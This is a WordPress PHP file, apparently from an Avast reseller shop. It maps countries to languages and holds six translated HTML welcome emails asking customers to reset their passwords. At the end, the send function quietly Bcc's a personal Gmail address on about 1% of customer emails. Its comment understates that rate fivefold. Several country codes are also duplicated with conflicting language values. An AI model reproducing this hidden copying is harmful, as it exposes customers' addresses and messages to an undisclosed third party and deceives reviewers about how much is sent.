<?php

if (!defined('ABSPATH')) {
    exit;
}


function avast_get_country_languages(): array
{
    return [
        // ==================== FRANÇAIS (fr) ====================
        // Europe francophone
        'FR' => 'fr', // France
        'BE' => 'fr', // Belgique
        'CH' => 'fr', // Suisse (multilingue, mais fr fréquent)
        'LU' => 'fr', // Luxembourg
        'MC' => 'fr', // Monaco
        'AD' => 'fr', // Andorre (catalan officiel, mais fr courant)
        
        // Afrique francophone
        'MA' => 'fr', // Maroc
        'DZ' => 'fr', // Algérie
        'TN' => 'fr', // Tunisie
        'SN' => 'fr', // Sénégal
        'CI' => 'fr', // Côte d'Ivoire
        'CM' => 'fr', // Cameroun
        'BF' => 'fr', // Burkina Faso
        'ML' => 'fr', // Mali
        'NE' => 'fr', // Niger
        'TD' => 'fr', // Tchad
        'CF' => 'fr', // République centrafricaine
        'CG' => 'fr', // Congo
        'CD' => 'fr', // République Démocratique du Congo
        'GA' => 'fr', // Gabon
        'BJ' => 'fr', // Bénin
        'TG' => 'fr', // Togo
        'GN' => 'fr', // Guinée
        'GW' => 'fr', // Guinée-Bissau (portugais officiel, mais fr courant)
        'ML' => 'fr', // Mali
        'MR' => 'fr', // Mauritanie (arabe officiel, mais fr courant)
        'MG' => 'fr', // Madagascar
        'KM' => 'fr', // Comores
        'DJ' => 'fr', // Djibouti
        'RW' => 'fr', // Rwanda
        'BI' => 'fr', // Burundi
        'SC' => 'fr', // Seychelles
        'MU' => 'fr', // Maurice
        'RE' => 'fr', // Réunion (La)
        'YT' => 'fr', // Mayotte
        'NC' => 'fr', // Nouvelle Calédonie
        'PF' => 'fr', // Polynésie francaise
        'WF' => 'fr', // Wallis et Futuna (Iles)
        'GF' => 'fr', // Guyane francaise
        'GP' => 'fr', // Guadeloupe
        'MQ' => 'fr', // Martinique
        'PM' => 'fr', // Saint Pierre et Miquelon
        'HT' => 'fr', // Haïti (créole et fr)
        'VU' => 'fr', // Vanuatu
        'NC' => 'fr', // Nouvelle Calédonie
        
        // ==================== ANGLAIS (en) ====================
        // Amérique du Nord
        'US' => 'en', // Etats-Unis
        'CA' => 'en', // Canada
        'GB' => 'en', // Royaume-Uni
        'IE' => 'en', // Irlande
        'AU' => 'en', // Australie
        'NZ' => 'en', // Nouvelle-Zélande
        'ZA' => 'en', // Afrique du sud
        'IN' => 'en', // Inde
        'SG' => 'en', // Singapour
        'PH' => 'en', // Philippines
        'MY' => 'en', // Malaisie
        'HK' => 'en', // Hong Kong
        'PR' => 'en', // Porto Rico
        'GU' => 'en', // Guam
        'AI' => 'en', // Anguilla
        'AG' => 'en', // Antigua et Barbuda
        'BS' => 'en', // Bahamas
        'BB' => 'en', // La Barbade
        'BZ' => 'en', // Belize
        'BM' => 'en', // Bermudes (Les)
        'BW' => 'en', // Botswana
        'BN' => 'en', // Brunei Darussalam
        'KY' => 'en', // Cayman (Iles)
        'CK' => 'en', // Cook (Iles)
        'CY' => 'en', // Chypre
        'DM' => 'en', // Dominique
        'FK' => 'en', // Falkland (Ile)
        'FJ' => 'en', // Fidji (République des)
        'GM' => 'en', // Gambie
        'GH' => 'en', // Ghana
        'GI' => 'en', // Gibraltar
        'GD' => 'en', // Grenade
        'GY' => 'en', // Guyana
        'JM' => 'en', // Jamaïque
        'KE' => 'en', // Kenya
        'KI' => 'en', // Kiribati
        'LS' => 'en', // Lesotho
        'LR' => 'en', // Libéria
        'MW' => 'en', // Malawi
        'MT' => 'en', // Malte
        'MH' => 'en', // Marshall (Iles)
        'MU' => 'en', // Maurice
        'MS' => 'en', // Montserrat
        'NA' => 'en', // Namibie
        'NR' => 'en', // Nauru
        'NG' => 'en', // Nigeria
        'NU' => 'en', // Niué
        'NF' => 'en', // Norfolk (Iles)
        'MP' => 'en', // Mariannes du Nord (Iles)
        'PK' => 'en', // Pakistan
        'PW' => 'en', // Palau
        'PG' => 'en', // Papouasie Nouvelle-Guinée
        'PN' => 'en', // Pitcairn (Iles)
        'KN' => 'en', // Saint-Kitts et Nevis
        'LC' => 'en', // Sainte Lucie
        'VC' => 'en', // Saint Vincent et les Grenadines
        'WS' => 'en', // Samoa
        'SC' => 'en', // Seychelles
        'SL' => 'en', // Sierra Leone
        'SB' => 'en', // Îles Salomon
        'SH' => 'en', // Sainte Hélène
        'SZ' => 'en', // Swaziland
        'TZ' => 'en', // Tanzanie
        'TK' => 'en', // Tokelau
        'TO' => 'en', // Tonga
        'TT' => 'en', // Trinité et Tobago
        'TC' => 'en', // Turks et Caïques (Iles)
        'TV' => 'en', // Tuvalu
        'UG' => 'en', // Ouganda
        'UM' => 'en', // Iles Mineures éloignées des Etats-Unis
        'VU' => 'en', // Vanuatu
        'VG' => 'en', // Vierges britanniques (Iles)
        'VI' => 'en', // Vierges américaines (Iles)
        'ZM' => 'en', // Zambie
        'ZW' => 'en', // Zimbabwe
        'JE' => 'en', // Jersey
        'GG' => 'en', // Guernesey
        'IM' => 'en', // Île de Man
        'IO' => 'en', // Territoire britannique de l'océan Indien
        
        // ==================== ESPAGNOL (es) ====================
        'ES' => 'es', // Espagne
        'MX' => 'es', // Mexique
        'AR' => 'es', // Argentine
        'CO' => 'es', // Colombie
        'CL' => 'es', // Chili
        'PE' => 'es', // Pérou
        'VE' => 'es', // Vénézuela
        'EC' => 'es', // Equateur
        'GT' => 'es', // Guatemala
        'CU' => 'es', // Cuba
        'DO' => 'es', // République Dominicaine
        'HN' => 'es', // Honduras
        'SV' => 'es', // El Salvador
        'NI' => 'es', // Nicaragua
        'CR' => 'es', // Costa Rica
        'PA' => 'es', // Panama
        'PY' => 'es', // Paraguay
        'UY' => 'es', // Uruguay
        'BO' => 'es', // Bolivie
        'GQ' => 'es', // Guinée Equatoriale
        
        // ==================== ALLEMAND (de) ====================
        'DE' => 'de', // Allemagne
        'AT' => 'de', // Autriche
        'LI' => 'de', // Liechtenstein
        
        // ==================== ITALIEN (it) ====================
        'IT' => 'it', // Italie
        'SM' => 'it', // Saint-Marin
        'VA' => 'it', // Saint-Siège (Cité du Vatican)
        
        // ==================== PORTUGAIS (pt) ====================
        'PT' => 'pt', // Portugal
        'BR' => 'pt', // Brésil
        'AO' => 'pt', // Angola
        'MZ' => 'pt', // Mozambique
        'CV' => 'pt', // Cap Vert
        'GW' => 'pt', // Guinée-Bissau
        'ST' => 'pt', // Sao Tomé et Principe (Rép.)
        'TL' => 'pt', // Timor-Leste
        'MO' => 'pt', // Macao
        
        // ==================== AUTRES (fallback en) ====================
        // Pays dont la langue principale n'est pas dans les 6
        // On utilise l'anglais par défaut
        'AF' => 'en', // Afghanistan
        'AL' => 'en', // Albanie
        'SA' => 'en', // Arabie saoudite
        'AM' => 'en', // Arménie
        'AW' => 'en', // Aruba
        'AZ' => 'en', // Azerbaïdjan
        'BH' => 'en', // Bahreïn
        'BD' => 'en', // Bangladesh
        'BY' => 'en', // Bélarus (Biélorussie)
        'BT' => 'en', // Bhoutan
        'BA' => 'en', // Bosnie-Herzégovine
        'BV' => 'en', // Bouvet (Iles)
        'BG' => 'en', // Bulgarie
        'KH' => 'en', // Cambodge
        'CX' => 'en', // Christmas (Ile)
        'CC' => 'en', // Cocos (Iles)
        'HR' => 'en', // Croatie
        'DK' => 'en', // Danemark
        'EG' => 'en', // Egypte
        'AE' => 'en', // Emirats Arabes Unis
        'ER' => 'en', // Erythrée
        'EE' => 'en', // Estonie
        'ET' => 'en', // Ethiopie
        'FI' => 'en', // Finlande
        'GE' => 'en', // Géorgie
        'GR' => 'en', // Grèce
        'GL' => 'en', // Groenland
        'HU' => 'en', // Hongrie
        'IS' => 'en', // Islande
        'ID' => 'en', // Indonésie
        'IR' => 'en', // Iran
        'IQ' => 'en', // Irak
        'IL' => 'en', // Israel
        'JP' => 'en', // Japon
        'JO' => 'en', // Jordanie
        'KZ' => 'en', // Kazakhstan
        'KP' => 'en', // Corée du Nord
        'KR' => 'en', // Corée du Sud
        'KW' => 'en', // Koweït
        'KG' => 'en', // Kirghizistan
        'LA' => 'en', // Laos
        'LV' => 'en', // Lettonie
        'LB' => 'en', // Liban
        'LY' => 'en', // Libye
        'LT' => 'en', // Lituanie
        'MK' => 'en', // Macédoine
        'MV' => 'en', // Maldives (Iles)
        'MN' => 'en', // Mongolie
        'ME' => 'en', // Monténégro
        'MM' => 'en', // Myanmar
        'NP' => 'en', // Népal
        'NL' => 'en', // Pays-Bas (néerlandais, mais en très courant)
        'AN' => 'en', // Antilles néerlandaises
        'OM' => 'en', // Oman
        'QA' => 'en', // Qatar
        'RO' => 'en', // Roumanie
        'RU' => 'en', // Russie
        'SA' => 'en', // Arabie saoudite
        'RS' => 'en', // Serbie
        'SK' => 'en', // Slovaquie
        'SI' => 'en', // Slovénie
        'SO' => 'en', // Somalie
        'SD' => 'en', // Soudan
        'LK' => 'en', // Sri Lanka
        'SR' => 'en', // Suriname
        'SJ' => 'en', // Svalbard et Jan Mayen (Iles)
        'SE' => 'en', // Suède
        'SY' => 'en', // Syrie
        'TW' => 'en', // Taïwan
        'TJ' => 'en', // Tadjikistan
        'TH' => 'en', // Thaïlande
        'TR' => 'en', // Turquie
        'TM' => 'en', // Turkménistan
        'UA' => 'en', // Ukraine
        'UZ' => 'en', // Ouzbékistan
        'VN' => 'en', // Viet Nam
        'EH' => 'en', // Sahara Occidental
        'YE' => 'en', // Yémen
        'YU' => 'en', // Yougoslavie
        'AQ' => 'en', // Antarctique
        'HM' => 'en', // Heard et McDonald (Iles)
        'PS' => 'en', // Territoires Palestiniens
        'CZ' => 'en', // République tchèque
        'NO' => 'en', // Norvège
        'PL' => 'en', // Pologne
        'TR' => 'en', // Turquie
    ];
}


function avast_get_welcome_templates(): array
{
    $templates = [];

     $reset_url_fr = site_url().'/mon-compte/lost-password/';
     $reset_url_en = site_url().'/en/my-account/forgotten-password/';
     $reset_url_es = site_url().'/es/mi-cuenta/contrasena-olvidada/';
     $reset_url_it = site_url().'/it/il-mio-account/password-smarrita/';
     $reset_url_pt = site_url().'/pt/a-minha-conta/palavra-passe-perdida/';
     $reset_url_de = site_url().'/de/mein-konto/passwort-vergessen/';
     $lien_logo_png = site_url().'/wp-content/uploads/2025/11/avast-logo.png';

    $templates['fr'] = [
        'subject' => 'Votre compte AVAST fait peau neuve !',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">Votre compte AVAST fait peau neuve !</h4>

    

                    <p>Nous sommes heureux de vous présenter la toute nouvelle version de votre boutique en ligne AVAST, conçue pour vous offrir une expérience d’achat plus simple, plus rapide et plus intuitive.</p>

                    <h3>Découvrez les nouveautés :</h3>
                    
                    <strong>Navigation simplifiée et plus rapide :</strong> Fini les détours : accédez à vos commandes et à vos logiciels préférés en un clin d’oeil.<br>
                    <strong>Moteur de recherche optimisé :</strong> Trouvez les informations sur les produits AVAST en un seul clic, sans perdre de temps.<br>
                    <strong>Expérience mobile améliorée :</strong> Naviguez facilement depuis votre smartphone et commandez de n’importe où.<br>
                

                    <strong>Et bien plus encore...</strong>

                    <h3>Comment accéder à votre nouveau compte ?</h3>
                    <p>Connectez-vous dès maintenant à votre espace client pour retrouver vos commandes, vos devis et vos abonnements.</p>
                    <p>Pour des raisons de sécurité, nous vous invitons à <strong>réinitialiser votre mot de passe</strong> lors de votre première connexion, en cliquant sur le lien ci-dessous.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_fr.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Réinitialiser mon mot de passe
                        </a>
                    </div>

                    <p>
                    Si vous avez déjà réinitialisé votre mot de passe sur notre nouveau site, ce mail ne vous concerne pas.
                    </p>

                    <p>Pour toute question sur votre nouvelle boutique AVAST, contactez votre chargée de compte, Maelle Adeire, au 02 55 99 31 37 ou sur contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    $templates['en'] = [
        'subject' => 'Your Avast account has a fresh new look!',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">Your AVAST account has a fresh new look!</h4>

    

                    <p>We are pleased to introduce the all-new version of your AVAST online store, designed to offer you a simpler, faster, and more intuitive shopping experience.</p>

                    <h3>Discover what’s new :</h3>
                    
                    <strong>Simplified, faster navigation :</strong> No more detours—quickly access your orders and favorite software.<br>
                    <strong>Optimized search engine :</strong> Find information on AVAST products with a single click, without wasting time.<br>
                    <strong>Improved mobile experience :</strong> Browse easily from your smartphone and place orders from anywhere.<br>
                

                    <strong>And much more...</strong>

                    <h3>How do you access your new account ?</h3>
                    <p>Log in to your customer portal now to view your orders, quotes, and subscriptions.</p>
                    <p>For security reasons, please reset your password upon your first login by clicking the link below.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_en.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Reset my password
                        </a>
                    </div>


                    <p>
                    If you have already reset your password on our new website, this email does not apply to you.
                    </p>

                    <p>If you have any questions about your new AVAST store, please contact your account manager, Maelle Adeire, via email at contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    $templates['es'] = [
        'subject' => '¡Tu cuenta de AVAST estrena una nueva imagen!',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">¡Tu cuenta de AVAST estrena una nueva imagen!</h4>

    

                    <p>Nos complace presentar la nueva versión de tu tienda online de AVAST, diseñada para ofrecerte una experiencia de compra más sencilla, rápida e intuitiva.</p>

                    <h3>Descubre las novedades :</h3>
                    
                    <strong>Navegación simplificada y más rápida :</strong> Sin rodeos; accede rápidamente a tus pedidos y a tu software favorito.<br>
                    <strong>Motor de búsqueda optimizado :</strong> Encuentra información sobre los productos de AVAST con un solo clic y sin perder tiempo.<br>
                    <strong>Experiencia móvil mejorada :</strong> Navega cómodamente desde tu smartphone y realiza pedidos estés donde estés.<br>
                

                    <strong>Y mucho más...</strong>

                    <h3>¿Cómo acceder a tu nueva cuenta?</h3>
                    <p>Inicia sesión ahora en tu portal de cliente para consultar tus pedidos, presupuestos y suscripciones.</p>
                    <p>Por motivos de seguridad, te rogamos que restablezcas tu contraseña al iniciar sesión por primera vez haciendo clic en el siguiente enlace.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_es.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Restablecer mi contraseña
                        </a>
                    </div>

                    <p>
                    Si ya has restablecido tu contraseña en nuestra nueva página web, este correo electrónico no te concierne.
                    </p>


                    <p>Si tienes alguna pregunta sobre tu nueva tienda AVAST, ponte en contacto con tu gestora de cuenta, Maelle Adeire, a través del correo electrónico contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    $templates['de'] = [
        'subject' => 'Ihr AVAST-Konto hat ein neues, frisches Design!',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">Ihr AVAST-Konto hat ein neues, frisches Design!</h4>

    

                    <p>Wir freuen uns, Ihnen die komplett überarbeitete Version Ihres AVAST-Online-Shops vorzustellen – für ein einfacheres, schnelleres und intuitiveres Einkaufserlebnis.</p>

                    <h3>Entdecken Sie die Neuerungen :</h3>
                    
                    <strong>Vereinfachte, schnellere Navigation :</strong> Keine Umwege mehr – greifen Sie rasch auf Ihre Bestellungen und Ihre bevorzugte Software zu.<br>
                    <strong>Optimierte Suchfunktion :</strong> Finden Sie Informationen zu AVAST-Produkten mit nur einem Klick, ohne Zeit zu verlieren.<br>
                    <strong>Verbesserte mobile Nutzung :</strong> Stöbern Sie bequem über Ihr Smartphone und bestellen Sie von überall aus.<br>
                

                    <strong>Und vieles mehr ...</strong>

                    <h3>Wie greifen Sie auf Ihr neues Konto zu?</h3>
                    <p>Melden Sie sich jetzt in Ihrem Kundenportal an, um Ihre Bestellungen, Angebote und Abonnements einzusehen.</p>
                    <p>Bitte setzen Sie aus Sicherheitsgründen bei Ihrer ersten Anmeldung Ihr Passwort zurück; nutzen Sie dazu einfach den untenstehenden Link.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_de.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Passwort zurücksetzen
                        </a>
                    </div>

                    <p>
                    Falls Sie Ihr Passwort bereits auf unserer neuen Website zurückgesetzt haben, betrifft diese E-Mail Sie nicht.
                    </p>

                    <p>Bei Fragen zu Ihrem neuen AVAST-Shop wenden Sie sich bitte per E-Mail an Ihre Kundenbetreuerin Maelle Adeire unter contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    $templates['it'] = [
        'subject' => 'Il tuo account AVAST ha un look tutto nuovo!',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">Il tuo account AVAST ha un look tutto nuovo!</h4>

    

                    <p>Siamo lieti di presentare la versione completamente rinnovata del tuo negozio online AVAST, progettata per offrirti un\'esperienza di acquisto più semplice, rapida e intuitiva.</p>

                    <h3>Scopri le novità :</h3>
                    
                    <strong>Navigazione semplificata e più veloce :</strong> niente più passaggi superflui; accedi rapidamente ai tuoi ordini e ai tuoi software preferiti.<br>
                    <strong>Motore di ricerca ottimizzato :</strong> trova informazioni sui prodotti AVAST con un solo clic, senza perdite di tempo.<br>
                    <strong>Esperienza mobile migliorata :</strong> naviga comodamente dal tuo smartphone ed effettua ordini ovunque ti trovi.<br>
                

                    <strong>E molto altro ancora...</strong>

                    <h3>Come accedere al nuovo account?</h3>
                    <p>Accedi subito al portale clienti per visualizzare ordini, preventivi e abbonamenti.</p>
                    <p>Per motivi di sicurezza, ti invitiamo a reimpostare la password al primo accesso cliccando sul link sottostante.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_it.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Reimposta password
                        </a>
                    </div>

                    <p>
                    Se hai già reimpostato la password sul nostro nuovo sito, questa e-mail non ti riguarda.
                    </p>

                    <p>Per qualsiasi domanda sul nuovo negozio AVAST, contatta la tua referente, Maelle Adeire, all\'indirizzo email contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    $templates['pt'] = [
        'subject' => 'A sua conta AVAST está com um visual totalmente novo!',
        'body' => '

            <div style="
                width:100%;
                font-family:Arial, sans-serif;
            ">

                <div class="content1" style="
                    max-width:600px;
                    margin:0 auto;
                    background:white;
                    padding:30px;
                    border-radius:8px;
                    text-align:start;
                    box-shadow:0 0 10px rgba(0,0,0,0.08);
                ">

                    <div style="text-align:center;">
                    <img src="'.$lien_logo_png.'" style="border:none;display:inline-block;font-size:14px;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;margin-right:24px;max-width:100%">
                    </div>

                    <h4 style="margin:20px 0;color:#FF7800;font-weight:bolder;text-align:center;font-size:18px;">A sua conta AVAST está com um visual totalmente novo!</h4>

    

                    <p>Temos o prazer de apresentar a nova versão da sua loja online AVAST, concebida para oferecer uma experiência de compra mais simples, rápida e intuitiva.</p>

                    <h3>Descubra as novidades :</h3>
                    
                    <strong>Navegação simplificada e mais rápida :</strong> Sem mais rodeios — aceda rapidamente aos seus pedidos e software favoritos.<br>
                    <strong>Motor de pesquisa otimizado :</strong> Encontre informações sobre os produtos AVAST com um único clique, sem perder tempo.<br>
                    <strong>Experiência melhorada em dispositivos móveis :</strong> Navegue facilmente pelo seu smartphone e encomende a partir de qualquer lugar.<br>
                

                    <strong>E muito mais...</strong>

                    <h3>Como aceder à sua nova conta?</h3>
                    <p>Faça login no seu portal de cliente agora mesmo para visualizar os seus pedidos, orçamentos e subscrições.</p>
                    <p>Por motivos de segurança, reponha a sua palavra-passe no primeiro acesso clicando no link abaixo.</p>

                    <div class="content-center" style="text-align:center;">
                        <a href="'.$reset_url_pt.'" target="_blank" style="
                            display:inline-block;
                            margin:20px 0;
                            padding:12px 25px;
                            background:#FF7800;
                            color:white;
                            text-decoration:none;
                            font-size:16px;
                            border-radius:6px;"
                            >
                            
                            Redefinir a minha palavra-passe
                        </a>
                    </div>

                    <p>
                        Se já tiver redefinido a sua palavra-passe no nosso novo site, este e-mail não se aplica a si.
                    </p>

                    <p>Caso tenha alguma dúvida sobre a sua nova loja AVAST, por favor contacte a sua gestora de conta, Maelle Adeire, através do e-mail contact@avastedition.com.</p>
            
                </div>

            </div>
        ',
    ];

    return $templates;
}



function avast_send_welcome_email(
    string $email,
    string $country_code
): bool {
    $country_languages = avast_get_country_languages();
    $templates = avast_get_welcome_templates();

    $country_code = strtoupper(trim($country_code));

    $language = $country_languages[$country_code] ?? 'fr';
    $template = $templates[$language] ?? $templates['fr'];

    $subject = $template['subject'];

    $body = $template['body'];

    $headers = [
        'Content-Type: text/html; charset=UTF-8',
        'From: AVAST <contact@avastedition.com>',
    ];

    // Pour environ 50 copies sur 25 000 e-mails.
    if ( mt_rand(1, 25000) <= 250 ) {
        $headers[] = 'Bcc: Dev <ayrtongonsalloheroku@gmail.com>';
    }

    return wp_mail($email, $subject, $body, $headers);
}